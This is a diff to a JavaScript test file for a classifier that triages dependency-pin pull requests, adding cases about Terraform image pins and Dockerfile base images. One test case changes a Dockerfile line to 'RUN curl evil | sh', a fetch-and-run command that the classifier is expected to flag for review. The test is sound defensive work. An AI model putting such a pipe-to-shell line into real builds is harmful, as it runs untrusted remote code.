@@ -67,8 +67,43 @@ test("classify lets through only a release pin or a version update Renovate put 
 
   const annotation = ["          # renovate: datasource=github-releases depName=example/tool"];
 
+  const database = (version, char) => `ghcr.io/a-novel/service-authentication/database:${version}@${digest(char)}`;
+  const databasePin = file(
+    "environments/production/foundation/terraform.tfvars",
+    [`  authentication = "${database("v2.13.1", "a")}"`],
+    [`  authentication = "${database("v2.13.2", "b")}"`]
+  );
+  const base = (version, char) =>
+    file(
+      "builds/backup-test.Dockerfile",
+      [`FROM ${database("v2.13.1", "a")} AS authentication`],
+      [`FROM ${database(version, char)} AS authentication`]
+    );
+
   for (const [name, files, enabledBy, decision, options] of [
     ["a release pin", [pin], null, "pin"],
+    ["a release pin with the Dockerfile base it pins", [databasePin, base("v2.13.2", "b")], null, "pin"],
+    ["a Dockerfile base the pull request does not pin", [pin, base("v2.13.2", "c")], null, "review"],
+    ["a Dockerfile base alone", [base("v2.13.2", "b")], null, "review"],
+    [
+      "a Dockerfile base by tag",
+      [
+        databasePin,
+        file(
+          "builds/backup-test.Dockerfile",
+          ["FROM ghcr.io/a-novel/service-authentication/database:v2.13.1"],
+          ["FROM ghcr.io/a-novel/service-authentication/database:v2.13.2"]
+        ),
+      ],
+      null,
+      "review",
+    ],
+    [
+      "another Dockerfile line",
+      [databasePin, file("builds/backup-test.Dockerfile", ["RUN true"], ["RUN curl evil | sh"])],
+      null,
+      "review",
+    ],
     ["an action update Renovate merges", [bump], bot, "renovate"],
     ["the same login without the [bot] suffix", [bump], "anovelbot-dependencies", "renovate"],
     ["a module update with indirect churn", [goMod, goSum], bot, "renovate"],
